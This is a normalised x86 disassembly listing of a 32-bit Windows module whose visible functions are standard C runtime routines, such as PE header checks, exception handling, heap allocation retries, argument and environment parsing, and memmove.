cmp edi 0x28
jb r-xdata
pop edi
pop esi
retn
sub_1000c280
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_1000c2c0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1000c310
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_1000c430
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_1000c280
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_1000c2c0
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1000c3d0
push sub_1000c430
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_1000c430
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_1000af0f
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_1000af0f
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x18 ]
mov [ ebx - 0x4 ] edx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push edi
mov ecx ebx
call sub_1000e1eb
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_1000e1a2
mov [ ebp - 0x1 ] 0x1
test eax eax
js r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_1000af0f
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_1000af0f
lea eax [ ebx + ebx * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
lea eax [ esi + eax * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
call sub_1000e1d2
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push edi
mov edx ebx
mov ecx eax
call sub_1000e1eb
mov eax [ ebp + 0xc ]
push rw-data
call sub_1000c310
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_1000af0f
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_1000e1b9
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_1000af0f
mov edx [ ebp + 0x8 ]
push 0x1
push edx
call [ rw-data ]
add esp 0x8
sub_1000c5bf
mov edi edi
push ebp
mov ebp esp
xor eax eax
mov eax [ eax * 8 + r--data ]
pop ebp
retn
inc eax
cmp eax 0x16
jb r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax * 8 + r--data ]
je r-xdata
xor eax eax
pop ebp
retn
sub_1000c5e5
mov edi edi
push ebp
mov ebp esp
sub esp 0x1fc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_1000c5bf
mov edi eax
xor ebx ebx
pop ecx
mov [ ebp - 0x1fc ] edi
cmp edi ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000af0f
leave
retn
push 0x3
call sub_1000e5c7
pop ecx
cmp eax 0x1
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
push 0x3
call sub_1000e5c7
pop ecx
test eax eax
jne r-xdata
cmp esi 0xffffffff
je r-xdata
cmp esi 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
xor eax eax
push r--data
push 0x314
mov edi rw-data
push edi
call sub_1000e564
add esp 0xc
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x1fc ]
push eax
lea eax [ ebp - 0x1f8 ]
push eax
mov [ ebp - 0x5 ] bl
call sub_1000e210
pop ecx
push eax
lea eax [ ebp - 0x1f8 ]
push eax
push esi
call [ WriteFile@IAT ]
inc eax
cmp eax 0x1f4
jb r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
jmp r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] ax
call [ GetModuleFileNameW@IAT ]
mov ebx 0x2fb
test eax eax
jne r-xdata
mov cl [ edi + eax * 2 ]
mov [ ebp + eax - 0x1f8 ] cl
cmp [ edi + eax * 2 ] bx
je r-xdata
call sub_1000bafe
push esi
call sub_1000e549
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push ebx
push esi
call sub_1000e564
add esp 0xc
test eax eax
je r-xdata
push r--data
mov esi 0x314
push esi
push edi
call sub_1000e407
add esp 0xc
test eax eax
jne r-xdata
push esi
call sub_1000e549
lea eax [ eax * 2 + rw-data ]
mov ecx eax
sub ecx esi
push 0x3
sar ecx 0x1
push r--data
sub ebx ecx
push ebx
push eax
call sub_1000e47c
add esp 0x14
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
push [ ebp - 0x1fc ]
push esi
push edi
call sub_1000e407
add esp 0xc
test eax eax
jne r-xdata
push 0x12010
push r--data
push edi
call sub_1000e29b
add esp 0xc
jmp r-xdata
sub_1000c794
push 0x3
call sub_1000e5c7
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_1000c5e5
push 0xff
call sub_1000c5e5
pop ecx
pop ecx
push 0x3
call sub_1000e5c7
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_1000c7cd
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
push esi
call sub_1000c0bc
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_1000c07a
pop ecx
mov [ esi ] eax
pop esi
sub_1000c807
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x8 ]
call sub_1000e606
mov edi eax
pop ecx
test edi edi
jne r-xdata
sub_1000c84c
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000e69a
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_1000c898
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000e71c
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_1000c8e6
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
push esi
lea eax [ ebp - 0x4c ]
push eax
call [ GetStartupInfoW@IAT ]
push 0x40
push 0x20
pop esi
push esi
call sub_1000c84c
pop ecx
pop ecx
xor ecx ecx
cmp eax ecx
jne r-xdata
lea edx [ eax + 0x800 ]
mov [ rw-data ] eax
mov [ rw-data ] esi
cmp eax edx
jae r-xdata
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
cmp [ ebp - 0x1a ] cx
je r-xdata
add eax 0x5
pop esi
leave
retn
xor ebx ebx
mov eax [ ebp - 0x18 ]
cmp eax ecx
je r-xdata
or [ eax - 0x5 ] 0xffffffff
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x3 ] ecx
mov [ eax + 0x1f ] 0xa00
mov [ eax + 0x21 ] 0xa
mov [ eax + 0x33 ] ecx
mov [ eax + 0x2f ] cl
mov esi [ rw-data ]
add eax 0x40
lea edx [ eax - 0x5 ]
add esi 0x800
cmp edx esi
jb r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov ebx [ eax ]
add eax 0x4
mov [ ebp - 0x4 ] eax
add eax ebx
mov esi 0x800
mov [ ebp - 0x8 ] eax
cmp ebx esi
jl r-xdata
lea eax [ ebx - 0x1 ]
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
cmp [ rw-data ] ebx
jge r-xdata
mov ebx esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
xor edi edi
test ebx ebx
jle r-xdata
mov edi rw-data
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax 0xffffffff
je r-xdata
mov ebx [ rw-data ]
add [ rw-data ] 0x20
lea ecx [ eax + 0x800 ]
mov [ edi ] eax
cmp eax ecx
jae r-xdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne r-xdata
add [ ebp - 0x8 ] 0x4
inc edi
inc [ ebp - 0x4 ]
cmp edi ebx
jl r-xdata
cmp eax 0xfffffffe
je r-xdata
add edi 0x4
cmp [ rw-data ] ebx
jl r-xdata
add eax 0x5
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov cl [ ecx ]
test cl 0x1
je r-xdata
push 0x40
push 0x20
call sub_1000c84c
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
or [ eax - 0x5 ] 0xffffffff
and [ eax + 0x3 ] 0x0
and [ eax + 0x1f ] 0x80
and [ eax + 0x33 ] 0x0
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x20 ] 0xa0a
mov [ eax + 0x2f ] 0x0
mov ecx [ edi ]
add eax 0x40
add ecx esi
lea edx [ eax - 0x5 ]
cmp edx ecx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
test cl 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
inc [ esi + 0x8 ]
jmp r-xdata
mov esi edi
and esi 0x1f
mov eax edi
sar eax 0x5
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
push eax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
pop edi
pop ebx
inc [ esi + 0x8 ]
sub_1000cb2b
mov edi edi
push esi
push edi
mov edi rw-data
add edi 0x4
cmp edi rw-data
jl r-xdata
lea ecx [ eax + 0x800 ]
cmp eax ecx
jae r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
pop edi
pop esi
retn
push [ edi ]
call sub_1000c7cd
and [ edi ] 0x0
pop ecx
lea esi [ eax + 0xc ]
mov eax [ edi ]
add esi 0x40
add eax 0x800
lea ecx [ esi - 0xc ]
cmp ecx eax
jb r-xdata
push esi
call [ DeleteCriticalSection@IAT ]
cmp [ esi - 0x4 ] 0x0
je r-xdata
sub_1000cb7e
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
push edi
xor edi edi
test esi esi
jne r-xdata
call sub_1000e049
mov al [ esi ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x4
inc edi
push edi
call sub_1000c84c
mov edi eax
pop ecx
pop ecx
mov [ rw-data ] edi
test edi edi
je r-xdata
pop edi
pop esi
retn
push esi
call sub_1000e210
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rw-data ]
push ebx
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push esi
call sub_1000e210
cmp [ esi ] 0x3d
pop ecx
lea ebx [ eax + 0x1 ]
je r-xdata
push [ rw-data ]
call sub_1000c7cd
and [ rw-data ] 0x0
and [ edi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
add esi ebx
push 0x1
push ebx
call sub_1000c84c
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
push [ rw-data ]
call sub_1000c7cd
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_1000e7c9
add esp 0xc
test eax eax
jne r-xdata
pop ecx
pop ebx
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1000bafe
int3
add edi 0x4
sub_1000cc5a
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
xor eax eax
push esi
mov [ edi ] eax
mov esi edx
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ebx ] edx
inc [ edi ]
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
mov bl 0x22
sete al
inc esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov bl [ esi ]
movzx eax bl
push eax
inc esi
call sub_1000e87b
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
mov [ ebp + 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
test bl bl
je r-xdata
inc [ edi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp bl 0x20
je r-xdata
dec esi
jmp r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
test edx edx
je r-xdata
cmp bl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ edx - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
inc [ ecx ]
leave
retn
and [ eax ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ecx ]
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ eax ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
je r-xdata
test cl 0x1
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
dec ecx
test edx edx
je r-xdata
shr ecx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi ]
test ecx ecx
jne r-xdata
mov [ edx ] 0x5c
inc edx
xor eax eax
xor ebx ebx
cmp [ ebp - 0x4 ] eax
sete al
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ edi ]
mov ecx [ ebp + 0x10 ]
jmp r-xdata
mov [ edx ] 0x0
inc edx
mov [ ebp + 0xc ] edx
test ebx ebx
je r-xdata
cmp al 0x20
je r-xdata
mov [ ebp + 0xc ] edx
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
movsx eax al
push eax
test edx edx
je r-xdata
cmp al 0x9
je r-xdata
xor ebx ebx
inc ebx
xor ecx ecx
jmp r-xdata
call sub_1000e87b
pop ecx
test eax eax
je r-xdata
call sub_1000e87b
pop ecx
test eax eax
je r-xdata
inc [ edi ]
mov edx [ ebp + 0xc ]
inc esi
inc [ edi ]
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
jmp r-xdata
mov al [ esi ]
mov ecx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ ecx ] al
inc esi
inc [ edi ]
sub_1000cdf4
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
push edi
cmp [ rw-data ] ebx
jne r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
cmp eax ebx
je r-xdata
call sub_1000e049
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x4 ] eax
cmp [ eax ] bl
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jae r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
lea edi [ ebp - 0xc ]
call sub_1000cc5a
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax 0x3fffffff
jae r-xdata
mov edi eax
shl edi 0x2
lea eax [ edi + ecx ]
cmp eax ecx
jb r-xdata
push eax
call sub_1000c807
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
add edi esi
push edi
push esi
lea edi [ ebp - 0xc ]
call sub_1000cc5a
mov eax [ ebp - 0x8 ]
add esp 0xc
dec eax
mov [ rw-data ] eax
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_1000ceaf
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
call [ GetEnvironmentStringsW@IAT ]
mov ebx eax
xor esi esi
cmp ebx esi
jne r-xdata
cmp [ ebx ] si
je r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ WideCharToMultiByte@IAT ]
push esi
push esi
push esi
sub eax ebx
push esi
sar eax 0x1
inc eax
push eax
push ebx
push esi
push esi
mov [ ebp - 0xc ] eax
call edi
mov [ ebp - 0x8 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
pop esi
pop ebx
leave
retn
push ebx
call [ FreeEnvironmentStringsW@IAT ]
xor eax eax
push eax
call sub_1000c807
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
push esi
push esi
push [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push ebx
push esi
push esi
call edi
test eax eax
jne r-xdata
push ebx
call [ FreeEnvironmentStringsW@IAT ]
mov eax [ ebp - 0x4 ]
jmp r-xdata
push [ ebp - 0x4 ]
call sub_1000c7cd
pop ecx
mov [ ebp - 0x4 ] esi
pop edi
sub_1000cf78
mov edi edi
push ebp
mov ebp esp
push esi
call sub_1000bcce
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov ecx [ esi + 0x5c ]
mov edx [ ebp + 0x8 ]
mov eax ecx
push edi
add ecx 0x90
cmp eax ecx
jae r-xdata
add eax 0xc
lea edi [ ecx + 0x90 ]
cmp eax edi
jb r-xdata
xor eax eax
cmp [ eax ] edx
je r-xdata
cmp [ eax ] edx
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
test eax eax
je r-xdata
pop edi
cmp edx 0x5
jne r-xdata
cmp edx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ esi + 0x60 ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call edx
push 0x24
pop ecx
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
add ecx 0xc
cmp ecx 0x90
jl r-xdata
mov eax [ eax ]
mov edi [ esi + 0x64 ]
cmp eax 0xc000008e
jne r-xdata
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call edx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
pop ecx
mov [ esi + 0x60 ] ebx
pop ebx
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
cmp eax 0xc00002b5
jne r-xdata
mov [ esi + 0x64 ] 0x8a
jmp r-xdata
cmp eax 0xc00002b4
jne r-xdata
mov [ esi + 0x64 ] 0x8d
jmp r-xdata
mov [ esi + 0x64 ] 0x8e
sub_1000d0c2
mov edi edi
push ebp
mov ebp esp
mov eax 0xe06d7363
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0xc ]
push eax
call sub_1000cf78
pop ecx
pop ecx
pop ebp
retn
sub_1000d0e2
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
or eax 0x4711
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_1000d185
call sub_1000b7f8
test eax eax
je r-xdata
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_1000b805
pop ecx
push 0x3
call sub_1000b1e6
int3
push 0x1
push 0x40000015
push 0x3
call sub_1000b9d5
add esp 0xc
sub_1000d1c0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_1000d244 ]
jmp [ ecx * 4 + jump_table_1000d2c4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1000d330 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_1000d4cc ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_1000d3d0 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1000d4cc ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
